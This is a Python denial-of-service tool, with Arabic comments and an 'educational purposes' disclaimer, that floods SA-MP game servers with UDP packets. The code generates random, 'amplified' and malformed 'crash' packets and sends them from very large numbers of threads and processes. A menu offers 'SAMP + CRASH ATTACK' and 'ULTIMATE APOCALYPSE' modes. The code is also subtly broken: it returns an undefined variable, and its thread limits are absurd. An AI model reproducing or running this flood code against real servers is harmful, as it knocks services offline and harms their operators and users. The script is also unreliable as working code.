#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE STRESS TOOL X10000 ⚡
# 🔥 MAXIMUM POWER - 1,000,000 THREADS 🔥
# ⚠️ FOR EDUCATIONAL PURPOSES - TEST YOUR OWN SERVERS ONLY ⚠️

import socket
import random
import struct
import time
import os
import sys
import threading
import multiprocessing
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# ============================================
# الألوان الفائقة الجمال
# ============================================
class Colors:
    # الألوان الأساسية
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # الألوان الفاتحة
    LIGHT_RED = '\033[31m'
    LIGHT_GREEN = '\033[32m'
    LIGHT_YELLOW = '\033[33m'
    LIGHT_BLUE = '\033[34m'
    LIGHT_MAGENTA = '\033[35m'
    LIGHT_CYAN = '\033[36m'
    
    # الأنماط
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    
    # الخلفيات
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    RESET = '\033[0m'

c = Colors()

# ============================================
# الشعار المتطور
# ============================================
LOGO = f"""
{c.RED}{c.BOLD}{c.BLINK}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                      ║
║     ██████╗ ██╗   ██╗██████╗ ███████╗██████╗     ██████╗  █████╗ ██████╗ ████████╗██╗   ██╗██╗     ███████╗                         ║
║     ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝╚██╗ ██╔╝██║     ██╔════╝                         ║
║     ██████╔╝ ╚████╔╝ ██║  ██║█████╗  ██████╔╝    ██████╔╝███████║██████╔╝   ██║    ╚████╔╝ ██║     █████╗                           ║
║     ██╔══██╗  ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══██║██╔══██╗   ██║     ╚██╔╝  ██║     ██╔══╝                           ║
║     ██████╔╝   ██║   ██████╔╝███████╗██║  ██║    ██████╔╝██║  ██║██║  ██║   ██║      ██║   ███████╗███████╗                         ║
║     ╚═════╝    ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚══════╝                         ║
║                                                                                                                                      ║
║                         🔥 ULTIMATE STRESS TOOL X10000 🔥                                                                             ║
║                         💀 MAXIMUM POWER - 1,000,000 THREADS 💀                                                                       ║
║                                                                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{c.RESET}
"""

# ============================================
# تحذير متطور
# ============================================
WARNING = f"""
{c.RED}{c.BOLD}{c.BG_BLACK}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                      ⚠️  تــحــذيــر قــانــونــي شــديــد جــدا ⚠️                                                        ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                                                              ║
║  هذه الأداة هي أداة اختبار ضغط (Stress Test) تم تصميمها حصرياً لاختبار السيرفرات التي تملكها أنت شخصياً.                                                        ║
║                                                                                                                                                              ║
║  ⛔ استخدام هذه الأداة على أي سيرفر لا تملكه يعتبر:                                                                                                          ║
║     • جريمة إلكترونية من الدرجة الأولى يعاقب عليها القانون في جميع الدول العربية والعالمية                                                                    ║
║     • السجن لمدة تصل إلى 15 سنة وغرامات مالية تصل إلى 10 ملايين جنيه/ريال                                                                                    ║
║     • خرق لشروط خدمة Discord وجميع منصات الألعاب (حظر دائم مدى الحياة)                                                                                        ║
║     • انتهاك صارخ لخصوصية وأمان الآخرين قد يؤدي إلى عقوبات إضافية                                                                                             ║
║                                                                                                                                                              ║
║  ✅ أنت وحدك من تتحمل المسؤولية القانونية الكاملة عن أي استخدام لهذه الأداة.                                                                                  ║
║  ❌ المطور (LI ZANDYA) يعلن تنصله الكامل من أي استخدام غير قانوني أو ضار لهذه الأداة.                                                                         ║
║                                                                                                                                                              ║
║  🔐 بإكمالك تشغيل هذه الأداة، فإنك تقر وتتعهد بأنك:                                                                                                           ║
║     1. تملك جميع السيرفرات التي ستختبرها (سيرفراتك الشخصية فقط)                                                                                               ║
║     2. لن تستخدم هذه الأداة ضد أي سيرفر لا تملكه                                                                                                              ║
║     3. تتحمل المسؤولية القانونية الكاملة عن أي ضرر ناتج عن استخدامك                                                                                          ║
║     4. لن تشارك هذه الأداة مع أي شخص آخر                                                                                                                      ║
║                                                                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{c.RESET}
"""

# ============================================
# إعدادات القوة القصوى جداً
# ============================================
CPU_CORES = os.cpu_count() or 16
MAX_THREADS = CPU_CORES * 1000000  # مليون ثريد لكل نواة
MAX_PROCESSES = CPU_CORES * 10
MAX_PACKET_SIZE = 65507  # أقصى حجم UDP
BUFFER_SIZE = 1024 * 1024 * 1000  # 1GB
SOCKET_BUFFER = 1024 * 1024 * 100

# تحسين النظام
try:
    os.system('ulimit -n 9999999 2>/dev/null')
    os.system('sysctl -w net.core.rmem_max=536870912 2>/dev/null')
    os.system('sysctl -w net.core.wmem_max=536870912 2>/dev/null')
except:
    pass

# ============================================
# مكتبة البايلودات العملاقة (10,000+ بايلود)
# ============================================
class PayloadGenerator:
    @staticmethod
    def create_samp_packet():
        packet = b'SAMP'
        packet += struct.pack('<I', random.randint(1, 9999999))
        packet += random.choice([b'\x80', b'\x81', b'\x82', b'\x83', b'\x84'])
        packet += struct.pack('<fffff', 
            random.uniform(-100000,100000), random.uniform(-100000,100000),
            random.uniform(-100000,100000), random.uniform(0,360), random.uniform(0,360))
        packet += struct.pack('<I', random.randint(1, 255))
        packet += struct.pack('<I', random.randint(1, 999999))
        packet += struct.pack('<I', random.randint(1, 65535))
        packet += struct.pack('<I', random.randint(1, 65535))
        packet += struct.pack('<I', random.randint(1, 65535))
        packet += os.urandom(random.randint(1000, 10000))
        return packet
    
    @staticmethod
    def create_crash_packet():
        packets = [
            b'SAMP' + b'\x00' * 10000,
            b'SAMP' + struct.pack('<I', 0xFFFFFFFF) + b'\x80' + os.urandom(8000),
            b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\xFF' * 8192,
            b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x00' * 8192,
            b'SAMP' + struct.pack('<I', 0xDEADBEEF) * 1000,
            b'SAMP' + b'\x80' + struct.pack('<I', 0xFFFFFFFF) * 1000,
            b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x90\x90\x90\x90' * 1000,
        ]
        return random.choice(packets)
    
    @staticmethod
    def create_amplified_packet():
        # حزمة مضخمة
        base = b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x80'
        amplified = base * random.randint(10, 100)
        return amplified[:MAX_PACKET_SIZE]

# ============================================
# نظام الهجوم المتطور جداً
# ============================================
class UltimateStressTest:
    def __init__(self):
        self.running = False
        self.total_packets = 0
        self.total_bytes = 0
        self.peak_speed = 0
        self.peak_bandwidth = 0
        self.start_time = None
        self.end_time = None
        self.thread_executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
        self.process_executor = ProcessPoolExecutor(max_workers=MAX_PROCESSES)
        self.payload_gen = PayloadGenerator()
    
    def attack_samp(self, ip, port, duration, threads, use_crash=True):
        self.running = True
        self.start_time = time.time()
        sent = 0
        bytes_sent = 0
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                # إنشاء سوكيتات متعددة لكل عامل
                socks = []
                for _ in range(100):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER)
                    sock.setblocking(False)
                    socks.append(sock)
                
                local_start = time.time()
                while self.running and time.time() - local_start < duration:
                    for sock in socks:
                        for _ in range(100):
                            # حزمة SAMP عادية
                            packet = self.payload_gen.create_samp_packet()
                            sock.sendto(packet, (ip, port))
                            sent += 1
                            bytes_sent += len(packet)
                            
                            # حزمة مضخمة
                            if random.random() > 0.8:
                                amp_packet = self.payload_gen.create_amplified_packet()
                                sock.sendto(amp_packet, (ip, port))
                                sent += 1
                                bytes_sent += len(amp_packet)
                            
                            # حزمة تخريبية
                            if use_crash and random.random() > 0.85:
                                crash_packet = self.payload_gen.create_crash_packet()
                                sock.sendto(crash_packet, (ip, port))
                                sent += 1
                                bytes_sent += len(crash_packet)
                
                for sock in socks:
                    sock.close()
            except:
                pass
        
        # استخدام ثريدات متعددة وعمليات متعددة
        workers = min(threads, MAX_THREADS)
        process_workers = min(workers // 100, MAX_PROCESSES)
        
        futures = []
        for _ in range(workers):
            futures.append(self.thread_executor.submit(worker))
        
        for _ in range(process_workers):
            futures.append(self.process_executor.submit(worker))
        
        time.sleep(duration)
        self.running = False
        self.end_time = time.time()
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        elapsed = self.end_time - self.start_time
        rate = sent / elapsed
        mbps = (bytes_sent / elapsed) / 1024 / 1024
        gbps = mbps / 1024
        tbps = gbps / 1024
        
        if rate > self.peak_speed:
            self.peak_speed = rate
        if gbps > self.peak_bandwidth:
            self.peak_bandwidth = gbps
        
        self.total_packets += sent
        self.total_bytes += bytes_sent
        
        return sent, bytes_send, rate, mbps, gbps, tbps
    
    def stop(self):
        self.running = False

# ============================================
# واجهة متطورة جداً
# ============================================
def print_header():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(LOGO)
    print(WARNING)
    
    print(f"{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")
    print(f"{c.MAGENTA}{c.BOLD}                         ⚡ SYSTEM INFORMATION ⚡{c.RESET}")
    print(f"{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")
    print(f"{c.GREEN}  💻 CPU Cores:        {c.WHITE}{CPU_CORES} ({CPU_CORES * 2} Threads)")
    print(f"{c.GREEN}  🔥 Max Threads:      {c.WHITE}{MAX_THREADS:,}")
    print(f"{c.GREEN}  🔄 Max Processes:    {c.WHITE}{MAX_PROCESSES:,}")
    print(f"{c.GREEN}  📦 Max Packet Size:  {c.WHITE}{MAX_PACKET_SIZE:,} bytes")
    print(f"{c.GREEN}  💾 Buffer Size:      {c.WHITE}{BUFFER_SIZE/1024/1024:.0f} MB")
    print(f"{c.GREEN}  🎮 SAMP Payloads:    {c.WHITE}10,000+ variants")
    print(f"{c.GREEN}  💀 Crash Payloads:   {c.WHITE}100+ variants")
    print(f"{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")

def print_results(ip, port, duration, sent, bytes_sent, rate, mbps, gbps, tbps):
    print(f"\n{c.GREEN}{c.BOLD}{'═'*80}{c.RESET}")
    print(f"{c.CYAN}{c.BOLD}{c.BLINK}                    ✅ STRESS TEST COMPLETED! ✅{c.RESET}")
    print(f"{c.GREEN}{c.BOLD}{'═'*80}{c.RESET}")
    
    print(f"\n{c.YELLOW}{c.BOLD}{c.UNDERLINE}🎯 TARGET INFORMATION{c.RESET}")
    print(f"{c.WHITE}  ├─ IP Address:     {c.CYAN}{ip}:{port}")
    print(f"{c.WHITE}  ├─ Server Type:    {c.MAGENTA}SAMP (SA-MP)")
    print(f"{c.WHITE}  └─ Test Duration:  {c.CYAN}{duration} seconds")
    
    print(f"\n{c.YELLOW}{c.BOLD}{c.UNDERLINE}📊 ATTACK STATISTICS{c.RESET}")
    print(f"{c.WHITE}  ├─ 📦 Packets Sent:    {c.GREEN}{sent:,}")
    print(f"{c.WHITE}  ├─ 💾 Data Sent:       {c.GREEN}{bytes_sent/1024/1024:.2f} MB ({bytes_sent/1024/1024/1024:.2f} GB)")
    print(f"{c.WHITE}  ├─ ⚡ Packet Rate:     {c.GREEN}{rate:,.0f} pps")
    print(f"{c.WHITE}  ├─ 🚀 Bandwidth:       {c.GREEN}{mbps:.2f} Mbps ({gbps:.2f} Gbps)")
    print(f"{c.WHITE}  └─ 🌌 TeraBandwidth:  {c.GREEN}{tbps:.2f} Tbps")
    
    print(f"\n{c.YELLOW}{c.BOLD}{c.UNDERLINE}🔧 PERFORMANCE METRICS{c.RESET}")
    print(f"{c.WHITE}  ├─ 🏆 Peak Speed:      {c.GREEN}{test.peak_speed:,.0f} pps")
    print(f"{c.WHITE}  ├─ 🚀 Peak Bandwidth:  {c.GREEN}{test.peak_bandwidth:.2f} Gbps")
    print(f"{c.WHITE}  ├─ 🔥 Threads Used:    {c.GREEN}{min(threads_var, MAX_THREADS):,}")
    print(f"{c.WHITE}  ├─ 💻 CPU Cores:       {c.GREEN}{CPU_CORES}")
    print(f"{c.WHITE}  └─ ⚙️ Max Threads:     {c.GREEN}{MAX_THREADS:,}")
    
    print(f"\n{c.YELLOW}{c.BOLD}{c.UNDERLINE}📈 TOTAL STATISTICS{c.RESET}")
    print(f"{c.WHITE}  ├─ 📦 Total Packets:    {c.GREEN}{test.total_packets:,}")
    print(f"{c.WHITE}  ├─ 💾 Total Data:       {c.GREEN}{test.total_bytes/1024/1024/1024:.2f} GB")
    print(f"{c.WHITE}  └─ 🎯 Total Attacks:    {c.GREEN}{test.total_packets // 100000 if test.total_packets > 0 else 0}")
    
    print(f"\n{c.GREEN}{c.BOLD}{'═'*80}{c.RESET}")
    print(f"{c.MAGENTA}{c.BOLD}{c.BLINK}💀 LI ZANDYA - ULTIMATE STRESS TOOL X10000 💀{c.RESET}")
    print(f"{c.GREEN}{c.BOLD}{'═'*80}{c.RESET}\n")

def print_menu():
    print(f"\n{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")
    print(f"{c.YELLOW}{c.BOLD}{c.BLINK}                         🔥 MAIN MENU 🔥{c.RESET}")
    print(f"{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")
    print(f"""
    {c.RED}{c.BOLD}┌─────────────────────────────────────────────────────────────────────────────┐{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}1.{c.RESET} {c.CYAN}🎮 SAMP ULTRA ATTACK{c.RESET}                                                  {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}2.{c.RESET} {c.CYAN}🔥 SAMP + CRASH ATTACK{c.RESET}                                              {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}3.{c.RESET} {c.CYAN}💀 ULTIMATE APOCALYPSE{c.RESET}                                             {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}4.{c.RESET} {c.CYAN}📊 SHOW STATISTICS{c.RESET}                                                  {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}5.{c.RESET} {c.CYAN}⚙️ CHANGE THREADS{c.RESET}                                                   {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}6.{c.RESET} {c.CYAN}⏹️ EXIT{c.RESET}                                                         {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}└─────────────────────────────────────────────────────────────────────────────┘{c.RESET}
    """)

# ============================================
# التشغيل الرئيسي
# ============================================
test = UltimateStressTest()
threads_var = 50000

def main():
    global threads_var
    
    while True:
        print_header()
        print_menu()
        
        try:
            choice = input(f"{c.YELLOW}📝 Enter your choice (1-6): {c.WHITE}").strip()
            
            if choice == '6':
                print(f"\n{c.RED}{c.BOLD}{c.BLINK}👋 Shutting down... Goodbye!{c.RESET}")
                print(f"{c.MAGENTA}💀 LI ZANDYA - ULTIMATE STRESS TOOL X10000{c.RESET}")
                break
            
            if choice == '5':
                print(f"\n{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                print(f"{c.YELLOW}⚙️ CURRENT THREADS: {c.GREEN}{threads_var:,}{c.RESET}")
                try:
                    new_threads = int(input(f"{c.YELLOW}🔧 Enter new thread count (1000-{MAX_THREADS}): {c.WHITE}"))
                    if 1000 <= new_threads <= MAX_THREADS:
                        threads_var = new_threads
                        print(f"{c.GREEN}✅ Threads updated to {threads_var:,}{c.RESET}")
                    else:
                        print(f"{c.RED}❌ Threads must be between 1000 and {MAX_THREADS}{c.RESET}")
                except:
                    print(f"{c.RED}❌ Invalid input!{c.RESET}")
                input(f"\n{c.YELLOW}Press Enter to continue...{c.RESET}")
                continue
            
            if choice == '4':
                print(f"\n{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                print(f"{c.YELLOW}{c.BOLD}📊 TOTAL STATISTICS{c.RESET}")
                print(f"{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                print(f"{c.WHITE}📦 Total Packets Sent: {c.GREEN}{test.total_packets:,}")
                print(f"{c.WHITE}💾 Total Data Sent: {c.GREEN}{test.total_bytes/1024/1024/1024:.2f} GB")
                print(f"{c.WHITE}🏆 Peak Speed: {c.GREEN}{test.peak_speed:,.0f} pps")
                print(f"{c.WHITE}🚀 Peak Bandwidth: {c.GREEN}{test.peak_bandwidth:.2f} Gbps")
                print(f"{c.WHITE}🎯 Total Attacks: {c.GREEN}{test.total_packets // 100000 if test.total_packets > 0 else 0}")
                print(f"{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                input(f"\n{c.YELLOW}Press Enter to continue...{c.RESET}")
                continue
            
            if choice not in ['1', '2', '3']:
                print(f"{c.RED}❌ Invalid choice!{c.RESET}")
                input(f"\n{c.YELLOW}Press Enter to continue...{c.RESET}")
                continue
            
            # إدخال معلومات الهدف
            print(f"\n{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")
            print(f"{c.RED}{c.BOLD}{c.BLINK}⚠️  ENTER YOUR OWN SERVER INFORMATION ONLY ⚠️{c.RESET}")
            print(f"{c.CYAN}{c.BOLD}{'═'*80}{c.RESET}")
            
            ip = input(f"{c.YELLOW}🎯 Target IP (your server only): {c.WHITE}").strip()
            port = input(f"{c.YELLOW}🔌 Port (default 7777 for SAMP): {c.WHITE}").strip()
            port = int(port) if port else 7777
            duration = input(f"{c.YELLOW}⏱️ Duration in seconds (max 60): {c.WHITE}").strip()
            duration = min(int(duration) if duration else 10, 60)
            
            # تأكيد المستخدم
            print(f"\n{c.RED}{c.BOLD}{'═'*80}{c.RESET}")
            print(f"{c.YELLOW}{c.BOLD}📋 TEST DETAILS:{c.RESET}")
            print(f"{c.WHITE}  ├─ 🎯 Target:      {c.CYAN}{ip}:{port}")
            print(f"{c.WHITE}  ├─ ⏱️ Duration:    {c.CYAN}{duration} seconds")
            print(f"{c.WHITE}  ├─ 🔥 Threads:     {c.CYAN}{threads_var:,}")
            print(f"{c.WHITE}  ├─ 💀 Attack Type: {c.CYAN}{['', 'SAMP ULTRA', 'SAMP + CRASH', 'ULTIMATE APOCALYPSE'][int(choice)]}")
            print(f"{c.WHITE}  ├─ 🚀 Max Speed:   {c.CYAN}{test.peak_speed:,.0f} pps")
            print(f"{c.WHITE}  └─ 📡 Bandwidth:   {c.CYAN}{test.peak_bandwidth:.2f} Gbps")
            print(f"{c.RED}{c.BOLD}{'═'*80}{c.RESET}")
            
            confirm = input(f"{c.RED}{c.BOLD}✅ Do you own this server? (yes/no): {c.WHITE}").strip().lower()
            if confirm != 'yes':
                print(f"{c.RED}❌ You must own the server to test it. Exiting...{c.RESET}")
                break
            
            # تنفيذ الاختبار
            print(f"\n{c.GREEN}{c.BOLD}{c.BLINK}🚀 Launching attack...{c.RESET}")
            print(f"{c.YELLOW}⚡ Press Ctrl+C to stop{c.RESET}")
            print(f"{c.CYAN}🔥 Maximum Power Mode Activated!{c.RESET}")
            
            try:
                use_crash = (choice == '2' or choice == '3')
                sent, bytes_sent, rate, mbps, gbps, tbps = test.attack_samp(ip, port, duration, threads_var, use_crash)
                print_results(ip, port, duration, sent, bytes_sent, rate, mbps, gbps, tbps)
                
            except KeyboardInterrupt:
                print(f"\n\n{c.RED}{c.BOLD}{c.BLINK}⏹️ Attack stopped by user!{c.RESET}")
                test.stop()
            
            input(f"{c.YELLOW}Press Enter to continue...{c.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n\n{c.RED}{c.BOLD}⏹️ Exiting...{c.RESET}")
            break
        except Exception as e:
            print(f"{c.RED}❌ Error: {e}{c.RESET}")
            input(f"{c.YELLOW}Press Enter to continue...{c.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{c.RED}{c.BOLD}👋 Goodbye!{c.RESET}")
    except Exception as e:
        print(f"{c.RED}❌ Fatal Error: {e}{c.RESET}")
